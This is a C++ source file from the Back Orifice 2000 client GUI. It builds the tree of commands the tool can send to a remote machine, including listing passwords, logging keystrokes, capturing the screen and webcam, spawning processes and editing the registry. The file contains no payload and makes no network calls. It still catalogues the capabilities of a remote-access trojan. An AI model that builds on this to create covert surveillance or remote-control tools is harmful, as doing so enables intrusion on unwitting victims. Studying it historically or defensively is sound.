/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// BOCmdDescList.cpp: implementation of the CBOCmdDescList class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "bo2kgui.h"
#include "BOCmdDescList.h"
#include "comm_native.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CBOCmdDescList::CBOCmdDescList()
{
	int i;
	for(i=0;i<MAX_BO_COMMANDS;i++) {
		m_descList[i].svCommName[0]='\0';
		m_descList[i].svFolderName[0]='\0';
	}
}

CBOCmdDescList::~CBOCmdDescList()
{

}

void CBOCmdDescList::SetDesc(int nCommand)
{
	if(nCommand>=MAX_BO_COMMANDS) return;
	m_descList[nCommand].svCommName[0]='\0';
	m_descList[nCommand].svFolderName[0]='\0';
}

void CBOCmdDescList::SetDesc(int nCommand, char *szFolderName, char *szCommName, char *szArgDesc1, char *szArgDesc2, char *szArgDesc3, BOOL bNative)
{
	if(nCommand>=MAX_BO_COMMANDS) return;

	m_descList[nCommand].bNative=bNative;
	
	if(szFolderName==NULL) m_descList[nCommand].svFolderName[0]='\0';
	else lstrcpyn(m_descList[nCommand].svFolderName,szFolderName,32);
	
	if(szCommName==NULL) m_descList[nCommand].svCommName[0]='\0';
	else lstrcpyn(m_descList[nCommand].svCommName,szCommName,32);
	
	if(szArgDesc1==NULL) m_descList[nCommand].svArgDesc1[0]='\0';
	else lstrcpyn(m_descList[nCommand].svArgDesc1,szArgDesc1,32);
	
	if(szArgDesc2==NULL) m_descList[nCommand].svArgDesc2[0]='\0';
	else lstrcpyn(m_descList[nCommand].svArgDesc2,szArgDesc2,32);

	if(szArgDesc3==NULL) m_descList[nCommand].svArgDesc3[0]='\0';
	else lstrcpyn(m_descList[nCommand].svArgDesc3,szArgDesc3,32);
}

int CBOCmdDescList::GetCommand(char *szFolderName, char *szCommName)
{
	int i;
	for(i=0;i<MAX_BO_COMMANDS;i++) {
		if((lstrcmp(m_descList[i].svCommName,szCommName)==0) &&
           (lstrcmp(m_descList[i].svFolderName,szFolderName)==0)) {
			return i;
		}
	}
	return -1;
}
	

char *CBOCmdDescList::GetFolderName(int nCommand)
{
	char *ptr;
	if(nCommand>=MAX_BO_COMMANDS) return NULL;
	ptr=m_descList[nCommand].svFolderName;
	if(ptr[0]=='\0') return NULL;
	return ptr;
}

char *CBOCmdDescList::GetCommName(int nCommand)
{
	char *ptr;
	if(nCommand>=MAX_BO_COMMANDS) return NULL;
	ptr=m_descList[nCommand].svCommName;
	if(ptr[0]=='\0') return NULL;
	return ptr;
}

char *CBOCmdDescList::GetArgDesc1(int nCommand)
{
	char *ptr;
	if(nCommand>=MAX_BO_COMMANDS) return NULL;
	ptr=m_descList[nCommand].svArgDesc1;
	if(ptr[0]=='\0') return NULL;
	return ptr;
}

char *CBOCmdDescList::GetArgDesc2(int nCommand)
{
	char *ptr;
	if(nCommand>=MAX_BO_COMMANDS) return NULL;
	ptr=m_descList[nCommand].svArgDesc2;
	if(ptr[0]=='\0') return NULL;
	return ptr;
}

char *CBOCmdDescList::GetArgDesc3(int nCommand)
{
	char *ptr;
	if(nCommand>=MAX_BO_COMMANDS) return NULL;
	ptr=m_descList[nCommand].svArgDesc3;
	if(ptr[0]=='\0') return NULL;
	return ptr;
}


void CBOCmdDescList::FillTreeCtrl(CTreeCtrl *pTree)
{
	// Initialize tree control
	pTree->DeleteAllItems();
	
	// Add all commands to tree
	int i;
	for(i=0;i<MAX_BO_COMMANDS;i++) {
		if(m_descList[i].svCommName[0]=='\0') continue;
		if(m_descList[i].svFolderName[0]=='\0') continue;

		// Look for folder name in top level
		HTREEITEM htiFolder;
		for(htiFolder=pTree->GetRootItem(); htiFolder!=NULL; htiFolder=pTree->GetNextSiblingItem(htiFolder)) {
			if(pTree->GetItemText(htiFolder).CompareNoCase(m_descList[i].svFolderName)==0) 
				break;
		}
		if(htiFolder==NULL) {
			// Make folder if it does not exist
			if(m_descList[i].bNative) {
				htiFolder=pTree->InsertItem(m_descList[i].svFolderName,0,1);
			} else {
				htiFolder=pTree->InsertItem(m_descList[i].svFolderName,2,3);
			}
			pTree->SetItemData(htiFolder,-1);
		}

		// Add item to folder
		HTREEITEM item;
		if(m_descList[i].bNative) {
			item=pTree->InsertItem(m_descList[i].svCommName,4,5,htiFolder);
		} else {
			item=pTree->InsertItem(m_descList[i].svCommName,6,7,htiFolder);
		}
		pTree->SetItemData(item,i);
	}
}


void CBOCmdDescList::SetNativeCommands(void)
{
	int i;
	for(i=0;i<MAX_BO_COMMANDS;i++) {
		m_descList[i].svCommName[0]='\0';
	}

	SetDesc(BO_PING,"Simple","Ping",NULL,NULL,NULL,TRUE);
	SetDesc(BO_QUERY,"Simple","Query",NULL,NULL,NULL,TRUE);

	// System Commands
	
	SetDesc(BO_SYSREBOOT,"System","Reboot Machine",NULL,NULL,NULL,TRUE);
	SetDesc(BO_SYSLOCKUP,"System","Lock-up Machine",NULL,NULL,NULL,TRUE);
	SetDesc(BO_SYSLISTPASSWORDS,"System","List Passwords",NULL,NULL,NULL,TRUE);
	//SetDesc(BO_SYSVIEWCONSOLE,"System","View Console",NULL,NULL,NULL,TRUE);
	SetDesc(BO_SYSINFO,"System","Get System Info",NULL,NULL,NULL,TRUE);
	
	// Key Logging
	SetDesc(BO_SYSLOGKEYS,"Key Logging","Log Keystrokes",NULL,"Disk File",NULL,TRUE);
	SetDesc(BO_SYSENDKEYLOG,"Key Logging","End Keystroke Log",NULL,NULL,NULL,TRUE);
	SetDesc(BO_SYSLOGVIEW,"Key Logging","View Keystroke Log",NULL,"Disk File",NULL,TRUE);
	SetDesc(BO_SYSLOGDELETE,"Key Logging","Delete Keystroke Log",NULL,"Disk File",NULL,TRUE);
	
	// GUI Commands
	SetDesc(BO_SYSMESSAGEBOX,"GUI","System Message Box",NULL,"Title","Text",TRUE);
		
	// TCP/IP
	SetDesc(BO_REDIRADD,"TCP/IP","Map Port -> Other IP","Server Port","Target IP Address:Port",NULL,TRUE);
	SetDesc(BO_APPADD,"TCP/IP","Map Port -> Console App","Port","Full command line",NULL,TRUE);
	SetDesc(BO_HTTPENABLE,"TCP/IP","Map Port -> HTTP Fileserver","Port","Root Path",NULL,TRUE);
	SetDesc(BO_TCPFILERECEIVE,"TCP/IP","Map Port -> TCP File Receive","Port","Pathname",NULL,TRUE);
	SetDesc(BO_PORTLIST,"TCP/IP","List Mapped Ports",NULL,NULL,NULL,TRUE);
	SetDesc(BO_PORTDEL,"TCP/IP","Remove Mapped Port","Port",NULL,NULL,TRUE);
	SetDesc(BO_TCPFILESEND,"TCP/IP","TCP File Send","[Source Port]","Target Address:Port","Pathname",TRUE);
		
	// M$ Networking Commands
	SetDesc(BO_NETEXPORTADD,"M$ Networking","Add Share",NULL,"Pathname","Share Name",TRUE);
	SetDesc(BO_NETEXPORTDELETE,"M$ Networking","Remove Share",NULL,NULL,"Share Name",TRUE);
	SetDesc(BO_NETEXPORTLIST,"M$ Networking","List Shares",NULL,NULL,NULL,TRUE);
	SetDesc(BO_NETVIEW,"M$ Networking","List Shares on LAN",NULL,NULL,NULL,TRUE);
	SetDesc(BO_NETUSE,"M$ Networking","Map Shared Device",NULL,"Local Name, Remote Share Path","[Username:Password]",TRUE);
	SetDesc(BO_NETDELETE,"M$ Networking","Unmap Shared Device",NULL,"Local Name",NULL,TRUE);
	SetDesc(BO_NETCONNECTIONS,"M$ Networking","List Connections",NULL,NULL,NULL,TRUE);
	
	// Process Handling
	
	SetDesc(BO_PROCESSLIST,"Process Control","List Processes",NULL,"[Remote machine]",NULL,TRUE);
	SetDesc(BO_PROCESSKILL,"Process Control","Kill Process",NULL,"Process ID",NULL,TRUE);
	SetDesc(BO_PROCESSSPAWN,"Process Control","Start Process",NULL,"Pathname and arguments",NULL,TRUE);
	
	// Registry Management
	
	SetDesc(BO_REGISTRYCREATEKEY,"Registry","Create Key",NULL,"Full Key Path",NULL,TRUE);
	SetDesc(BO_REGISTRYSETVALUE,"Registry","Set Value",NULL,"Full Key Path","Type:(Value Name):Value Data",TRUE);
	SetDesc(BO_REGISTRYGETVALUE,"Registry","Get Value",NULL,"Full Key Path","Value Name",TRUE);
	SetDesc(BO_REGISTRYDELETEKEY,"Registry","Delete Key",NULL,"Full Key Path",NULL,TRUE);
	SetDesc(BO_REGISTRYDELETEVALUE,"Registry","Delete Value",NULL,"Full Key Path","Value Name",TRUE);
	SetDesc(BO_REGISTRYRENAMEKEY,"Registry","Rename Key",NULL,"Full Key Path","New Key Name",TRUE);
	SetDesc(BO_REGISTRYRENAMEVALUE,"Registry","Rename Value",NULL,"Full Key Path\\\\Value Name","New Value Name",TRUE);

	SetDesc(BO_REGISTRYENUMKEYS,"Registry","Enumerate Keys",NULL,"Root Key Path",NULL,TRUE);
	SetDesc(BO_REGISTRYENUMVALS,"Registry","Enumerate Values",NULL,"Full Key Path",NULL,TRUE);
	
	// Multimedia Controls 
	
	SetDesc(BO_MMCAPFRAME,"Multimedia","Capture Video Still","Device #","Filename","[Width][,Height][,BPP]",TRUE);
	SetDesc(BO_MMCAPAVI,"Multimedia","Capture AVI","Device #","Filename","[Sec][,Width][,Height][,BPP][,FPS]",TRUE);
	SetDesc(BO_MMPLAYSOUND,"Multimedia","Play WAV File",NULL,"Filename",NULL,TRUE);
	SetDesc(BO_MMLOOPSOUND,"Multimedia","Play WAV File In Loop",NULL,"Filename",NULL,TRUE);
	SetDesc(BO_MMSTOPSOUND,"Multimedia","Stop WAV File",NULL,NULL,NULL,TRUE);
	SetDesc(BO_MMLISTCAPS,"Multimedia","List Capture Devices",NULL,NULL,NULL,TRUE);
	SetDesc(BO_MMCAPSCREEN,"Multimedia","Capture Screen",NULL,"Filename",NULL,TRUE);
	
	// File and Directory Commands
	
	SetDesc(BO_DIRECTORYLIST,"File/Directory","List Directory",NULL,"Pathname",NULL,TRUE);
	SetDesc(BO_FILEFIND,"File/Directory","Find File",NULL,"Root path","Filename Spec",TRUE);
	SetDesc(BO_FILEDELETE,"File/Directory","Delete File",NULL,"Pathname",NULL,TRUE);
	SetDesc(BO_FILEVIEW,"File/Directory","View File",NULL,"Pathname",NULL,TRUE);
	SetDesc(BO_FILERENAME,"File/Directory","Move/Rename File",NULL,"Pathname","New Pathname",TRUE);
	SetDesc(BO_FILECOPY,"File/Directory","Copy File",NULL,"Source Pathname","Target Pathname",TRUE);
	SetDesc(BO_DIRECTORYMAKE,"File/Directory","Make Directory",NULL,"Pathname",NULL,TRUE);
	SetDesc(BO_DIRECTORYDELETE,"File/Directory","Remove Directory",NULL,"Pathname",NULL,TRUE);
	SetDesc(BO_SETFILEATTR,"File/Directory","Set File Attributes",NULL,"Pathname","Attributes (ARSHT)",TRUE);
	SetDesc(BO_RECEIVEFILE,"File/Directory","Receive File",NULL,"[BINDSTR,NET,ENC,AUTH]","Pathname",TRUE);
	SetDesc(BO_SENDFILE,"File/Directory","Send File",NULL,"Address[,NET,ENC,AUTH]","Pathname",TRUE);
	SetDesc(BO_EMITFILE,"File/Directory","Emit File",NULL,"[BINDSTR,NET,ENC,AUTH]","Pathname",TRUE);
	SetDesc(BO_LISTTRANSFERS,"File/Directory","List Transfers",NULL,NULL,NULL,TRUE);
	SetDesc(BO_CANCELTRANSFER,"File/Directory","Cancel Transfer",NULL,NULL,"Pathname",TRUE);

	
	// File Compression
	
	SetDesc(BO_FILEFREEZE,"Compression","Freeze File",NULL,"Pathname","Output Pathname",TRUE);
	SetDesc(BO_FILEMELT,"Compression","Melt File",NULL,"Pathname", "Output Pathname",TRUE);
		
	// Resolver
	SetDesc(BO_RESOLVEHOST,"DNS","Resolve Hostname",NULL,"Hostname",NULL,TRUE);
	SetDesc(BO_RESOLVEADDR,"DNS","Resolve Address",NULL,"Address",NULL,TRUE);
	
	// Server Control
	SetDesc(BO_SHUTDOWNSERVER,"Server Control","Shutdown Server",NULL,"Type 'DELETE' to ERADICATE",NULL,TRUE);
	SetDesc(BO_RESTARTSERVER,"Server Control","Restart Server",NULL,"[Host process name]",NULL,TRUE);
	SetDesc(BO_LOADPLUGINDLL,"Server Control","Load Plugin",NULL,"Plugin Filename",NULL,TRUE);
	SetDesc(BO_DEBUGPLUGINDLL,"Server Control","Debug Plugin",NULL,"Plugin Filename",NULL,TRUE);
	SetDesc(BO_LISTPLUGINDLLS,"Server Control","List Plugins",NULL,NULL,NULL,TRUE);
	SetDesc(BO_REMOVEPLUGINDLL,"Server Control","Remove Plugins","Plugin #",NULL,NULL,TRUE);
	SetDesc(BO_STARTCOMMANDSOCKET,"Server Control","Start Command Socket",NULL,"[NETMOD][,ENC][,AUTH]","[Bind Str]",TRUE);
	SetDesc(BO_LISTCOMMANDSOCKETS,"Server Control","List Command Sockets",NULL,NULL,NULL,TRUE);
	SetDesc(BO_STOPCOMMANDSOCKET,"Server Control","Stop Command Socket","Command Socket #",NULL,NULL,TRUE);
	
	// Plugin interface
	
	SetDesc(BO_PLUGINEXECUTE,"Legacy Buttplugs","Start Buttplug",NULL,"Plugin DLL::FunctionName","Arguments",TRUE);
	SetDesc(BO_PLUGINLIST,"Legacy Buttplugs","List Buttplugs",NULL,NULL,NULL,TRUE);
	SetDesc(BO_PLUGINKILL,"Legacy Buttplugs","Stop Buttplug","Plugin #",NULL,NULL,TRUE);
}
